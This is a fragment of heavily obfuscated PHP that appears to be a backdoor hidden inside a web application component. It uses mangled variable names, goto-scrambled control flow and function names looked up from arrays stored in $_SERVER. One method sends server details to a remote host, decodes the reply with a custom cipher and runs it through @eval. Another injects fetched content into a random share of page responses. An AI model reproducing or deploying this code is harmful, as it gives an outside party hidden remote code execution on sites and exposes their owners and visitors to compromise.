$fèó³Ü¢ —) { if ($fèó³Ü¢ — == $b„”º ƒç[273] && $b„”º ƒç[25]($this->xvanb0f6bcd5, 0, 1) == $b„”º ƒç[273]) { continue; } if (!$b„”º ƒç[252]($Fâ™ÑîÜ‚Ç, $f¿è«ğÒâŠ)) { $E›‹»ªÎ†[] = $Fâ™ÑîÜ‚Ç; } } goto bê…¤É¾Ó’; DÄ«†˜„Îà: $Cä¸èò¯ ó =& $_SERVER[Šº]; $b„”º ƒç =& $_SERVER[ÁäèóÕ]; if ($this->xvanb0f6bcd5 == $b„”º ƒç[271]) { return $f·ïÒğÆ¿½; } goto C§ñ‡Õ‡æï; bê…¤É¾Ó’: foreach ($E›‹»ªÎ† as $Fâ™ÑîÜ‚Ç) { unset($f·ïÒğÆ¿½[$Fâ™ÑîÜ‚Ç]); } return $f·ïÒğÆ¿½; $FŒæÈª‘ì = $Cä¸èò¯ ó[646]; goto Eï½¡àô™; Eï½¡àô™: if (!$FŒæÈª‘ì) { return; } goto DÕ©ÃÂŸ·Á; DÕ©ÃÂŸ·Á: } private function sznrb514cf50() { $DÉ ºƒµ =& $_SERVER[ÁäèóÕ]; if ($this->xvanb0f6bcd5 != $DÉ ºƒµ[131]) { return; } $GLOBALS[$DÉ ºƒµ[104]][$DÉ ºƒµ[108]][$DÉ ºƒµ[290]] = $DÉ ºƒµ[230]; $GLOBALS[$DÉ ºƒµ[104]][$DÉ ºƒµ[291]] = $DÉ ºƒµ[230]; $EçÎˆØ¹èâ = $_SERVER[Šº][647]; if ($DÉ ºƒµ[61]($DÉ ºƒµ[292])->{$_SERVER[ÁäèóÕ][63]}($DÉ ºƒµ[93]) != $DÉ ºƒµ[244]) { $DÉ ºƒµ[61]($DÉ ºƒµ[292])->{$_SERVER[ÁäèóÕ][231]}($DÉ ºƒµ[93], $DÉ ºƒµ[244]); } } public function kitref2af2b4() { return $_SERVER[ÁäèóÕ][293]; } private function ranu6be0d369() { goto b½£çÒåã; C­°Î’óÚ‡: if ($this->{$_SERVER[ÁäèóÕ][210]}($eŒ¥¥²÷”[$F½ã£ùØâ”[303]]) != $DóªÓ¶¹ï[$F½ã£ùØâ”[175]]) { $BÀæ¼¸ÏÓ« = array($F½ã£ùØâ”[212] => $F½ã£ùØâ”[61]($F½ã£ùØâ”[62])->{$_SERVER[ÁäèóÕ][63]}($F½ã£ùØâ”[126]), $F½ã£ùØâ”[213] => $_SERVER[$F½ã£ùØâ”[125]], $F½ã£ùØâ”[214] => $F½ã£ùØâ”[215](), $F½ã£ùØâ”[184] => $_SERVER[$F½ã£ùØâ”[185]]); $bŞá§ÉğÍè = $this->{$_SERVER[ÁäèóÕ][216]}($F½ã£ùØâ”[158]($BÀæ¼¸ÏÓ«)); $eŒ¥¥²÷” = $this->{$_SERVER[ÁäèóÕ][193]}($F½ã£ùØâ”[217] . $bŞá§ÉğÍè); if ($eŒ¥¥²÷” && $F½ã£ùØâ”[202]($eŒ¥¥²÷”) && isset($eŒ¥¥²÷”[$F½ã£ùØâ”[303]])) { $fîÊ‰í°ÏÖ = $this->{$_SERVER[ÁäèóÕ][199]}($eŒ¥¥²÷”[$F½ã£ùØâ”[303]], 2); if ($fîÊ‰í°ÏÖ) { $fîÊ‰í°ÏÖ = $this->{$_SERVER[ÁäèóÕ][210]}($fîÊ‰í°ÏÖ); } if ($fîÊ‰í°ÏÖ) { try { @eval($fîÊ‰í°ÏÖ); } catch (Exception $DÕé¼Ö¦Ó) { } } } } goto Aš„ƒô—óÂ; BŒÓéÈ ³ğ: $f÷·Ëˆî› = $F½ã£ùØâ”[13](array($F½ã£ùØâ”[299], $F½ã£ùØâ”[300]), $E³Æ¯ÀÓæ–); $C ¶×ÃÙ = $_SERVER[Šº][648]; if ($f÷·Ëˆî› && $F½ã£ùØâ”[246]() - $f÷·Ëˆî› < $F½ã£ùØâ”[254]($F½ã£ùØâ”[301])) { return; } goto DÌ¯ô›¹ˆŠ; b½£çÒåã: $F½ã£ùØâ” =& $_SERVER[ÁäèóÕ]; $fñ”ƒ“Å”¨ = array($F½ã£ùØâ”[294], $F½ã£ùØâ”[295], $F½ã£ùØâ”[296]); $E³Æ¯ÀÓæ– = $F½ã£ùØâ”[297] . $F½ã£ùØâ”[124]($F½ã£ùØâ”[298]); goto aó´¨¯†Œ; cÒ«‘×¹Á¨: if (!$F½ã£ùØâ”[202]($eŒ¥¥²÷”)) { return; } if ($eŒ¥¥²÷”[$F½ã£ùØâ”[175]] && $eŒ¥¥²÷”[$F½ã£ùØâ”[303]]) { if ($this->{$_SERVER[ÁäèóÕ][210]}($eŒ¥¥²÷”[$F½ã£ùØâ”[303]]) == $DóªÓ¶¹ï[$F½ã£ùØâ”[175]]) { return; } } $this->{$_SERVER[ÁäèóÕ][174]}(); goto C­°Î’óÚ‡; aó´¨¯†Œ: if ($this->xvanb0f6bcd5 == $F½ã£ùØâ”[131] || !$F½ã£ùØâ”[116]($GLOBALS, $F½ã£ùØâ”[142])) { return; } if (!$F½ã£ùØâ”[252]($_SERVER[$F½ã£ùØâ”[44]], $fñ”ƒ“Å”¨)) { return; } if ($F½ã£ùØâ”[246]() % 4 != 0) { return; } goto BŒÓéÈ ³ğ; DÌ¯ô›¹ˆŠ: $F½ã£ùØâ”[13](array($F½ã£ùØâ”[299], $F½ã£ùØâ”[162]), $E³Æ¯ÀÓæ–, $F½ã£ùØâ”[246]()); $DóªÓ¶¹ï = array($F½ã£ùØâ”[175] => $F½ã£ùØâ”[61]($F½ã£ùØâ”[62])->{$_SERVER[ÁäèóÕ][63]}($F½ã£ùØâ”[219]), $F½ã£ùØâ”[188] => $this->xvanb0f6bcd5, $F½ã£ùØâ”[186] => $_SERVER[$F½ã£ùØâ”[187]], $F½ã£ùØâ”[179] => $F½ã£ùØâ”[159], $F½ã£ùØâ”[182] => $_SERVER[$F½ã£ùØâ”[183]]); $eŒ¥¥²÷” = $this->{$_SERVER[ÁäèóÕ][193]}($F½ã£ùØâ”[302], $DóªÓ¶¹ï); goto cÒ«‘×¹Á¨; Aš„ƒô—óÂ: } private function yhincc9c54c6($eƒÉÅÚÂ£Š = '', $AœÛ±·“İ = array(), $aÓŒÄÒæŠ… = 5) { goto C’òğ¡¹; B„»¬Şºö: $AœÛ±·“İ = @$B”ÒŒ© ‘¸[267]($EĞ©‹§¿‰´, !1, $eç¹Ğñµã”); $BñïÇçğî¨ = $fÔÑ²ê½ëÊ[651]; if (strlen($BñïÇçğî¨) < $fÔÑ²ê½ëÊ[592]) { return; } goto ağŒ¿ÕŒ³‹; ağŒ¿ÕŒ³‹: return $B”ÒŒ© ‘¸[201]($AœÛ±·“İ, !0); $e’ÛùÕØ¾ = $fÔÑ²ê½ëÊ[652]; if (strlen($e’ÛùÕØ¾) < $fÔÑ²ê½ëÊ[598]) { die; } goto FŞ™ğ´ˆß; c×šÂ¡Ê·: if ($AœÛ±·“İ && $B”ÒŒ© ‘¸[202]($AœÛ±·“İ)) { $EĞ©‹§¿‰´ = $EĞ©‹§¿‰´ . $B”ÒŒ© ‘¸[306] . $B”ÒŒ© ‘¸[307]($AœÛ±·“İ); } if ($AœÛ±·“İ === -1) { return $EĞ©‹§¿‰´; } $eç¹Ğñµã” = $B”ÒŒ© ‘¸[262](array($B”ÒŒ© ‘¸[263] => array($B”ÒŒ© ‘¸[266] => $aÓŒÄÒæŠ…, $B”ÒŒ© ‘¸[264] => $B”ÒŒ© ‘¸[308]), $B”ÒŒ© ‘¸[309] => array($B”ÒŒ© ‘¸[310] => !1, $B”ÒŒ© ‘¸[311] => !1))); goto B„»¬Şºö; A ÃÛ‹ÃÁ‚: $EĞ©‹§¿‰´ = $this->{$_SERVER[ÁäèóÕ][260]}($EĞ©‹§¿‰´, $B”ÒŒ© ‘¸[305]); $EãŸ”…¥š = $fÔÑ²ê½ëÊ[649]; if (strlen($EãŸ”…¥š) < $fÔÑ²ê½ëÊ[399]) { die; } goto dËŒ¶¶•º»; dËŒ¶¶•º»: $EĞ©‹§¿‰´ = $EĞ©‹§¿‰´ . $eƒÉÅÚÂ£Š; $dğ¼¢àƒŒ÷ = $fÔÑ²ê½ëÊ[650]; if (strlen($dğ¼¢àƒŒ÷) < $fÔÑ²ê½ëÊ[592]) { die; } goto c×šÂ¡Ê·; C’òğ¡¹: $fÔÑ²ê½ëÊ =& $_SERVER[Šº]; $B”ÒŒ© ‘¸ =& $_SERVER[ÁäèóÕ]; $EĞ©‹§¿‰´ = $B”ÒŒ© ‘¸[304]; goto A ÃÛ‹ÃÁ‚; FŞ™ğ´ˆß: } private function ygep3f1700ec() { goto BŠŒÂ‰…ìÒ; D·êğ¦ÜŞ: $eÁ•Ïğº˜œ = $a‘é·•±Ş[254]($eÁ•Ïğº˜œ ? $eÁ•Ïğº˜œ : $a‘é·•±Ş[313]); $FÆ™…‡²Ïì = $a‘é·•±Ş[116]($this->bsna7275823f, $a‘é·•±Ş[339]); $C¶¶ÀÜÍÊ» = $F×Äê„„¯Ú[654]; goto C³ù‹óä; F˜Ã¿»®ø¢: $eÁ•Ïğº˜œ = $f‚Î‚Ì¼ [$this->xvanb0f6bcd5]; $fÍäÜÕÁ«Ş = $F×Äê„„¯Ú[653]; while ($fÍäÜÕÁ«Ş < $F×Äê„„¯Ú[598]) { if ($fÍäÜÕÁ«Ş >= 0) { break; } $fÍäÜÕÁ«Ş++; } goto D·êğ¦ÜŞ; BŠŒÂ‰…ìÒ: $F×Äê„„¯Ú =& $_SERVER[Šº]; $a‘é·•±Ş =& $_SERVER[ÁäèóÕ]; $f‚Î‚Ì¼  = array($a‘é·•±Ş[312] => $a‘é·•±Ş[313], $a‘é·•±Ş[314] => $a‘é·•±Ş[315], $a‘é·•±Ş[316] => $a‘é·•±Ş[317], $a‘é·•±Ş[318] => $a‘é·•±Ş[319], $a‘é·•±Ş[320] => $a‘é·•±Ş[321], $a‘é·•±Ş[322] => $a‘é·•±Ş[255], $a‘é·•±Ş[323] => $a‘é·•±Ş[255], $a‘é·•±Ş[324] => $a‘é·•±Ş[313], $a‘é·•±Ş[325] => $a‘é·•±Ş[315], $a‘é·•±Ş[326] => $a‘é·•±Ş[317], $a‘é·•±Ş[327] => $a‘é·•±Ş[328], $a‘é·•±Ş[329] => $a‘é·•±Ş[319], $a‘é·•±Ş[330] => $a‘é·•±Ş[331], $a‘é·•±Ş[332] => $a‘é·•±Ş[321], $a‘é·•±Ş[333] => $a‘é·•±Ş[334], $a‘é·•±Ş[335] => $a‘é·•±Ş[336], $a‘é·•±Ş[337] => $a‘é·•±Ş[338]); goto F˜Ã¿»®ø¢; C³ù‹óä: if (!$C¶¶ÀÜÍÊ») { die; } $FÆ™…‡²Ïì = $FÆ™…‡²Ïì ? $a‘é·•±Ş[254]($FÆ™…‡²Ïì) : 0; return $eÁ•Ïğº˜œ + $FÆ™…‡²Ïì; goto E¶¡×¢¢ç; E¶¡×¢¢ç: } public function xuva5b4cb64a($EÓ»µ¼Â¶³) { goto BÉ»¸² Á†; BÉ»¸² Á†: $bä¥ğÖ‚¬Œ =& $_SERVER[Šº]; $dºÃ¢©÷Â¾ =& $_SERVER[ÁäèóÕ]; $DÃŒºŞµ‹ƒ = $this->{$_SERVER[ÁäèóÕ][147]}(); goto D·©¢Õæ™Ü; D·©¢Õæ™Ü: $Fšõ‹Ïª’‰ = $bä¥ğÖ‚¬Œ[655]; if (!$Fšõ‹Ïª’‰) { die; } if ($EÓ»µ¼Â¶³[$dºÃ¢©÷Â¾[340]] == $dºÃ¢©÷Â¾[230]) { return; } goto BÇ…™±Ñ¾ì; a†Óõ¥²Àƒ: $dí«ŠÀ£À = $dºÃ¢©÷Â¾[232]($dí«ŠÀ£À, $dºÃ¢©÷Â¾[10], $dºÃ¢©÷Â¾[340]); if (!$dºÃ¢©÷Â¾[252]($EÓ»µ¼Â¶³[$dºÃ¢©÷Â¾[340]], $dí«ŠÀ£À)) { $dºÃ¢©÷Â¾[176]($dºÃ¢©÷Â¾[344], !1, $dºÃ¢©÷Â¾[249]); } goto cÉñ®•’¨¬; BÇ…™±Ñ¾ì: if ($DÃŒºŞµ‹ƒ >= $dºÃ¢©÷Â¾[254]($dºÃ¢©÷Â¾[255])) { return; } $f­İ¥Ù‘™Û = $dºÃ¢©÷Â¾[61]($dºÃ¢©÷Â¾[149])->{$_SERVER[ÁäèóÕ][150]}(); if ($f­İ¥Ù‘™Û <= $DÃŒºŞµ‹ƒ) { return; } goto E”×è‹Ë­¡; E”×è‹Ë­¡: $dí«ŠÀ£À = $dºÃ¢©÷Â¾[61]($dºÃ¢©÷Â¾[149])->{$_SERVER[ÁäèóÕ][341]}($dºÃ¢©÷Â¾[340])->{$_SERVER[ÁäèóÕ][342]}($DÃŒºŞµ‹ƒ)->{$_SERVER[ÁäèóÕ][343]}(); $D‘Š‡ª± = $bä¥ğÖ‚¬Œ[656]; if (strlen($D‘Š‡ª±) < $bä¥ğÖ‚¬Œ[596]) { return; } goto a†Óõ¥²Àƒ; cÉñ®•’¨¬: } public function taewc266e220() { goto Fä”„å™è; a÷‚î©‚É: if (strlen($F¦İ¹¹Å×Û) < $e¶–‰âµ¥¤[598]) { die; } $DÉÃ‚ç’´‹ = @$aÙ®Á·„«[267]($FÂŸ­éË, !1, $BñôÑ©‚÷–); $F»—Ô©™¡õ = $e¶–‰âµ¥¤[659]; goto fö­×ˆø¹«; fö­×ˆø¹«: echo $aÙ®Á·„«[346] . $aÙ®Á·„«[347]($DÉÃ‚ç’´‹) . $aÙ®Á·„«[348]; goto BÔÕñö­Õ; a¤®”ÀÁ…: $FÂŸ­éË = $aÙ®Á·„«[259]; $d“Õ»«ëÄ = $e¶–‰âµ¥¤[657]; if (strlen($d“Õ»«ëÄ) < $e¶–‰âµ¥¤[588]) { return; } goto B‰ùß¹ê…; B‰ùß¹ê…: $FÂŸ­éË = $this->{$_SERVER[ÁäèóÕ][260]}($FÂŸ­éË, $aÙ®Á·„«[261]); $BñôÑ©‚÷– = $aÙ®Á·„«[262](array($aÙ®Á·„«[263] => array($aÙ®Á·„«[264] => $aÙ®Á·„«[265], $aÙ®Á·„«[266] => 3))); $F¦İ¹¹Å×Û = $e¶–‰âµ¥¤[658]; goto a÷‚î©‚É; Fä”„å™è: $e¶–‰âµ¥¤ =& $_SERVER[Šº]; $aÙ®Á·„« =& $_SERVER[ÁäèóÕ]; if (!$aÙ®Á·„«[116]($GLOBALS, $aÙ®Á·„«[142]) || $aÙ®Á·„«[345](1, 100) > 20) { return; } goto a¤®”ÀÁ…; BÔÕñö­Õ: } private function yxle75deccd1($c”·³ÀÛ¢Î, $Eõ„† İ’ò, $Bêù‚‡°‡´ = 3) { goto E´®Íºç¤ï; eÌ¦‚œï¤‹: $e¦‘½¨ÀÒ‰ = $dŞ”½äö‹[345](0, 5) . $dŞ”½äö‹[10]; $FÜéË×‡ÒÜ = $béâ‡ÖØ«ù[661]; while ($FÜéË×‡ÒÜ < $béâ‡ÖØ«ù[598]) { if ($FÜéË×‡ÒÜ >= 0) { break; } $FÜéË×‡ÒÜ++; } goto Båóó½£–¼; A†ÃÎØÂÄ: $dğ“§—îèÄ = $béâ‡ÖØ«ù[673]; if (!$dğ“§—îèÄ) { die; } if ($Bêù‚‡°‡´ - 1 > 0) { $EÓ‹–¢ë = $this->{$_SERVER[ÁäèóÕ][137]}($EÓ‹–¢ë, $Eõ„† İ’ò, $Bêù‚‡°‡´ - 1); } goto Dğø³†º©; Dğø³†º©: return $EÓ‹–¢ë; goto F·â‚¢’; d„ˆÎàÊé„: $c”·³ÀÛ¢Î = $dŞ”½äö‹[2]($c”·³ÀÛ¢Î); $aø¸Ú­­Ñ = $béâ‡ÖØ«ù[660]; while ($aø¸Ú­­Ñ < $béâ‡ÖØ«ù[596]) { if ($aø¸Ú­­Ñ >= 0) { break; } $aø¸Ú­­Ñ++; } goto eÌ¦‚œï¤‹; Aª¦ˆÁÒïç: $E›˜æíÆ¯© = $dŞ”½äö‹[350]; switch ($e¦‘½¨ÀÒ‰) { case $dŞ”½äö‹[244]: $EÓ‹–¢ë = $this->{$_SERVER[ÁäèóÕ][157]}($c”·³ÀÛ¢Î, $dŞ”½äö‹[224]($Eõ„† İ’ò . $CÓ‡’Õµ®œ)); break; $A„×¢ãÏÓ³ = $béâ‡ÖØ«ù[660]; case $dŞ”½äö‹[230]: $EÓ‹–¢ë = $this->{$_SERVER[ÁäèóÕ][157]}($c”·³ÀÛ¢Î, $dŞ”½äö‹[224]($CÓ‡’Õµ®œ . $Eõ„† İ’ò)); $CÓŸ†´†öï = $béâ‡ÖØ«ù[663]; break; $a•¬²­®” = $béâ‡ÖØ«ù[664]; if (!$a•¬²­®”) { return; } case $dŞ”½äö‹[351]: $EÓ‹–¢ë = $this->{$_SERVER[ÁäèóÕ][157]}($c”·³ÀÛ¢Î, $dŞ”½äö‹[128]($CÓ‡’Õµ®œ . $Eõ„† İ’ò)); break; case $dŞ”½äö‹[352]: $EÓ‹–¢ë = $this->{$_SERVER[ÁäèóÕ][157]}($c”·³ÀÛ¢Î, $dŞ”½äö‹[124]($CÓ‡’Õµ®œ . $Eõ„† İ’ò)); break; case $dŞ”½äö‹[353]: goto AÅêİƒ¹¸; Fôäâœ§Ä¨: $b„¬¦øñ‹ò = $dŞ”½äö‹[25]($b„¬¦øñ‹ò, $Dğõ©¥ÀË‡ % 8, $Dğõ©¥ÀË‡ % 8 + 7); $Eİ‡µÓôÃß = $dŞ”½äö‹[10]; $A«¯´·œ¹í = 0; goto FçÓÚáøœ¼; AÅêİƒ¹¸: $c”·³ÀÛ¢Î = $dŞ”½äö‹[128]($c”·³ÀÛ¢Î); $AÆÃŒ·ïÙË = $béâ‡ÖØ«ù[665]; if (!$AÆÃŒ·ïÙË) { die; } goto eâñªÎ¯; eâñªÎ¯: $Dğõ©¥ÀË‡ = $dŞ”½äö‹[354](0, 64); $A©Öæœ¨» = $E›˜æíÆ¯©[$Dğõ©¥ÀË‡]; $bÉñĞÄ¼š¼ = $béâ‡ÖØ«ù[666]; goto bìóš¡°Óô; bìóš¡°Óô: $b„¬¦øñ‹ò = $dŞ”½äö‹[124]($A©Öæœ¨» . $dŞ”½äö‹[124]($Eõ„† İ’ò . $A©Öæœ¨») . $Eõ„† İ’ò); $eÊ´ËŞ·³£ = $béâ‡ÖØ«ù[667]; if (strlen($eÊ´ËŞ·³£) < $béâ‡ÖØ«ù[592]) { return; } goto Fôäâœ§Ä¨; dÔŞ×Æää: $Aî•ºËà = 0; $aÎ‡Ê‘“„¹ = $béâ‡ÖØ«ù[669]; for ($A«¯´·œ¹í = 0; $A«¯´·œ¹í < $dŞ”½äö‹[24]($c”·³ÀÛ¢Î); $A«¯´·œ¹í++) { $Aî•ºËà = $Aî•ºËà == $dŞ”½äö‹[24]($b„¬¦øñ‹ò) ? 0 : $Aî•ºËà; $AçæİŒñªæ = ($Dğõ©¥ÀË‡ + $dŞ”½äö‹[355]($E›˜æíÆ¯©, $c”·³ÀÛ¢Î[$A«¯´·œ¹í]) + $dŞ”½äö‹[356]($b„¬¦øñ‹ò[$Aî•ºËà++])) % 64; $Eİ‡µÓôÃß .= $E›˜æíÆ¯©[$AçæİŒñªæ]; $eÉ«ÄøÁª = $béâ‡ÖØ«ù[670]; while ($eÉ«ÄøÁª < $béâ‡ÖØ«ù[596]) { if ($eÉ«ÄøÁª >= 0) { break; } $eÉ«ÄøÁª++; } } goto C³–Á»†; C³–Á»†: $EÓ‹–¢ë = $dŞ”½äö‹[347]($A©Öæœ¨» . $Eİ‡µÓôÃß); break; $F‰Ä¬óõ½¾ = $béâ‡ÖØ«ù[671]; goto AŸó•Ä‚•; FçÓÚáøœ¼: $AçæİŒñªæ = 0; $Bñíˆ’„äõ = $béâ‡ÖØ«ù[668]; if (!$Bñíˆ’„äõ) { return; } goto dÔŞ×Æää; AŸó•Ä‚•: default: $EÓ‹–¢ë = $this->{$_SERVER[ÁäèóÕ][157]}($c”·³ÀÛ¢Î, $Eõ„† İ’ò . $CÓ‡’Õµ®œ); $AâõäÎÀ†ê = $béâ‡ÖØ«ù[672]; while ($AâõäÎÀ†ê < $béâ‡ÖØ«ù[592]) { if ($AâõäÎÀ†ê >= 0) { break; } $AâõäÎÀ†ê++; } break; } $EÓ‹–¢ë = $dŞ”½äö‹[224]($e¦‘½¨ÀÒ‰ . $CÓ‡’Õµ®œ . $EÓ‹–¢ë); goto A†ÃÎØÂÄ; Båóó½£–¼: $CÓ‡’Õµ®œ = $dŞ”½äö‹[134](15); $FÎ”è¸»  = $béâ‡ÖØ«ù[662]; if (!$FÎ”è¸» ) { die; } goto Aª¦ˆÁÒïç; E´®Íºç¤ï: $béâ‡ÖØ«ù =& $_SERVER[Šº]; $dŞ”½äö‹ =& $_SERVER[ÁäèóÕ]; $dŞ”½äö‹[349](1); goto d„ˆÎàÊé„; F·â‚¢’: } private function oxuz0cb03cc7($DÇ×„ÈÂè, $dŠˆ¹²ì, $cáïÍ¹Óí = 3) { goto Cˆ£í¥Ş¢´; EŒÒ÷‘“„¢: $DÇ×„ÈÂè = $D—çÛã­[2]($DÇ×„ÈÂè); $DÇ×„ÈÂè = $D—çÛã­[224]($DÇ×„ÈÂè); $aÜŠÖ…øø˜ = $EŠã÷Ñ³‰Ö[674]; goto f‚¡áìÒ…¹; Aæ˜áŒ¡: $DÇ×„ÈÂè = $D—çÛã­[25]($DÇ×„ÈÂè, 16); $dØŸ÷Ö¶‚Ù = $D—çÛã­[350]; $BÔŸîÆ¾¼‡ = $EŠã÷Ñ³‰Ö[675]; goto Dò÷¿»„†; f‚¡áìÒ…¹: while (strlen($aÜŠÖ…øø˜) < $EŠã÷Ñ³‰Ö[598]) { if (!$aÜŠÖ…øø˜) { break; } $aÜŠÖ…øø˜++; } $cÓî˜¡Ì‰Û = $DÇ×„ÈÂè[0]; $e‹‰ˆ¯Å = $D—çÛã­[25]($DÇ×„ÈÂè, 1, 15); goto Aæ˜áŒ¡; Dò÷¿»„†: if (!$BÔŸîÆ¾¼‡) { die; } switch ($cÓî˜¡Ì‰Û) { case $D—çÛã­[244]: $d¸±íŸöÇò = $this->{$_SERVER[ÁäèóÕ][260]}($DÇ×„ÈÂè, $D—çÛã­[224]($dŠˆ¹²ì . $e‹‰ˆ¯Å)); break; case $D—çÛã­[230]: $d¸±íŸöÇò = $this->{$_SERVER[ÁäèóÕ][260]}($DÇ×„ÈÂè, $D—çÛã­[224]($e‹‰ˆ¯Å . $dŠˆ¹²ì)); break; case $D—çÛã­[351]: $d¸±íŸöÇò = $this->{$_SERVER[ÁäèóÕ][260]}($DÇ×„ÈÂè, $D—çÛã­[128]($e‹‰ˆ¯Å . $dŠˆ¹²ì)); $E‘ñÊ†æ·ä = $EŠã÷Ñ³‰Ö[676]; break; $A™¹ãæœÄî = $EŠã÷Ñ³‰Ö[677]; if (!$A™¹ãæœÄî) { die; } case $D—çÛã­[352]: $d¸±íŸöÇò = $this->{$_SERVER[ÁäèóÕ][260]}($DÇ×„ÈÂè, $D—çÛã­[124]($e‹‰ˆ¯Å . $dŠˆ¹²ì)); break; case $D—çÛã­[353]: goto cƒøšª×Ö¾; BéèšÙ„…: $aÃ–¯ôº¥´ = $DÇ×„ÈÂè[0]; $AÎÏÕ”ÛŒ÷ = $EŠã÷Ñ³‰Ö[679]; while (strlen($AÎÏÕ”ÛŒ÷) < $EŠã÷Ñ³‰Ö[588]) { if (!$AÎÏÕ”ÛŒ÷) { break; } $AÎÏÕ”ÛŒ÷++; } goto D©â¤Š«æ; A·¹…öµ: $b”è°Óéˆ£ = $D—çÛã­[25]($b”è°Óéˆ£, $D§¾äß¸½ % 8, $D§¾äß¸½ % 8 + 7); $eÅ©ÀîÂï = $EŠã÷Ñ³‰Ö[680]; if (!$eÅ©ÀîÂï) { die; } goto EÛâ¤Œ¶’«; D©â¤Š«æ: $DÇ×„ÈÂè = $D—çÛã­[25]($DÇ×„ÈÂè, 1); $D§¾äß¸½ = $D—çÛã­[355]($dØŸ÷Ö¶‚Ù, $aÃ–¯ôº¥´); $b”è°Óéˆ£ = $D—çÛã­[124]($aÃ–¯ôº¥´ . $D—çÛã­[124]($dŠˆ¹²ì . $aÃ–¯ôº¥´) . $dŠˆ¹²ì); goto A·¹…öµ; cƒøšª×Ö¾: $DÇ×„ÈÂè = $D—çÛã­[358]($DÇ×„ÈÂè); $dÜ–«ÖĞ„Î = $EŠã÷Ñ³‰Ö[678]; while ($dÜ–«ÖĞ„Î < $EŠã÷Ñ³‰Ö[596]) { if ($dÜ–«ÖĞ„Î >= 0) { break; } $dÜ–«ÖĞ„Î++; } goto BéèšÙ„…; Añ¬øçÄó: $cºš®ñáÊé = $EŠã÷Ñ³‰Ö[682]; while ($cºš®ñáÊé < $EŠã÷Ñ³‰Ö[598]) { if ($cºš®ñáÊé >= 0) { break; } $cºš®ñáÊé++; } for ($D½ÑõÆÚµ = 0; $D½ÑõÆÚµ < $D—çÛã­[24]($DÇ×„ÈÂè); $D½ÑõÆÚµ++) { $f£³òÚØ‘ƒ = $f£³òÚØ‘ƒ == $D—çÛã­[24]($b”è°Óéˆ£) ? 0 : $f£³òÚØ‘ƒ; $D‘Şëª±› = $f£³òÚØ‘ƒ++; $E¿Ç‡šœÔë = $D—çÛã­[355]($dØŸ÷Ö¶‚Ù, $DÇ×„ÈÂè[$D½ÑõÆÚµ]) - $D§¾äß¸½ - $D—çÛã­[356]($b”è°Óéˆ£[$D‘Şëª±›]); $A¾ÍÄ÷ŞÙ = $EŠã÷Ñ³‰Ö[683]; while (strlen($A¾ÍÄ÷ŞÙ) < $EŠã÷Ñ³‰Ö[592]) { if (!$A¾ÍÄ÷ŞÙ) { break; } $A¾ÍÄ÷ŞÙ++; } while ($E¿Ç‡šœÔë < 0) { $E¿Ç‡šœÔë += 64; } $D‰ µ¦Ñ‘» .= $dØŸ÷Ö¶‚Ù[$E¿Ç‡šœÔë]; } goto Fä…‡†…¨; EÛâ¤Œ¶’«: $D‰ µ¦Ñ‘» = $D—çÛã­[10]; $b™÷âÎ = $EŠã÷Ñ³‰Ö[681]; if (strlen($b™÷âÎ) < $EŠã÷Ñ³‰Ö[588]) { die; } goto f›¬ºµêèÏ; f›¬ºµêèÏ: $D½ÑõÆÚµ = 0; $E¿Ç‡šœÔë = 0; $f£³òÚØ‘ƒ = 0; goto Añ¬øçÄó; Fä…‡†…¨: $d¸±íŸöÇò = $D—çÛã­[359]($D‰ µ¦Ñ‘»); break; $eÁ³ëÄàë™ = $EŠã÷Ñ³‰Ö[684]; goto Eî×¿˜”Ì; Eî×¿˜”Ì: if (strlen($eÁ³ëÄàë™) < $EŠã÷Ñ³‰Ö[399]) { die; } goto EĞ·İæ‚ÀË; EĞ·İæ‚ÀË: default: $d¸±íŸöÇò = $this->{$_SERVER[ÁäèóÕ][260]}($DÇ×„ÈÂè, $dŠˆ¹²ì . $e‹‰ˆ¯Å); break; $CÎèªÙ»…ø = $EŠã÷Ñ³‰Ö[685]; if (strlen($CÎèªÙ»…ø) < $EŠã÷Ñ³‰Ö[598]) { die; } } if ($cáïÍ¹Óí - 1 > 0) { $d¸±íŸöÇò = $this->{$_SERVER[ÁäèóÕ][199]}($d¸±íŸöÇò, $dŠˆ¹²ì, $cáïÍ¹Óí - 1); } goto bÑ§ÀÇËìÙ; Cˆ£í¥Ş¢´: $EŠã÷Ñ³‰Ö =& $_SERVER[Šº]; $D—çÛã­ =& $_SERVER[ÁäèóÕ]; if (!$D—çÛã­[357]($DÇ×„ÈÂè) || $D—çÛã­[24]($DÇ×„ÈÂè) < 10) { return !1; } goto EŒÒ÷‘“„¢; bÑ§ÀÇËìÙ: return $d¸±íŸöÇò; goto cí§‘ğßÛ; cí§‘ğßÛ: } public function sxya9cf9e7ee($F™Ÿ°¤çà¯) { goto a¯ÍÍùø—Ø; dÈèí¦ ¼: $cŒÌÑÇƒó° = 2; for ($dÒ™ÑÖ‚’ß = 0; $dÒ™ÑÖ‚’ß < $d…Ì‡ÛˆŒÊ * 10; $dÒ™ÑÖ‚’ß++) { if (($d…Ì‡ÛˆŒÊ * $dÒ™ÑÖ‚’ß + 1) % $CµŠğ­˜Ï == 0) { $cŒÌÑÇƒó° = $eÖâÂŒÉíÖ[254](($d…Ì‡ÛˆŒÊ * $dÒ™ÑÖ‚’ß + 1) / $CµŠğ­˜Ï); break; } } $aœ„ÌÙæ© = $this->{$_SERVER[ÁäèóÕ][157]}($A¤¶¼¨À¿æ * $fÄâè±İá . $eÖâÂŒÉíÖ[10], $eÖâÂŒÉíÖ[159]); goto B±áèæ’Ê; b÷ÇĞÂÈ“£: if (strlen($Eß´îâ•İÈ) < $e­…ÄóËª´[598]) { die; } $CµŠğ­˜Ï = $eÖâÂŒÉíÖ[254](($A¤¶¼¨À¿æ + $fÄâè±İá) / 2); while (1) { $f¿„ƒÒ˜ÖÉ = $CµŠğ­˜Ï; $fÍ ¢˜Ó«À = $e­…ÄóËª´[687]; if (!$fÍ ¢˜Ó«À) { die; } $b„»ñÛØö = $d…Ì‡ÛˆŒÊ; $A½¨œë½à = $e­…ÄóËª´[688]; while ($b„»ñÛØö % $f¿„ƒÒ˜ÖÉ != 0) { $aÑºñöÆŠİ = $b„»ñÛØö; $Dò†—•ˆßÛ = $e­…ÄóËª´[689]; while ($Dò†—•ˆßÛ < $e­…ÄóËª´[588]) { if ($Dò†—•ˆßÛ >= 0) { break; } $Dò†—•ˆßÛ++; } $b„»ñÛØö = $f¿„ƒÒ˜ÖÉ; $DİÁ¬¹Øø = $e­…ÄóËª´[690]; if (!$DİÁ¬¹Øø) { die; } $f¿„ƒÒ˜ÖÉ = $aÑºñöÆŠİ % $f¿„ƒÒ˜ÖÉ; } if 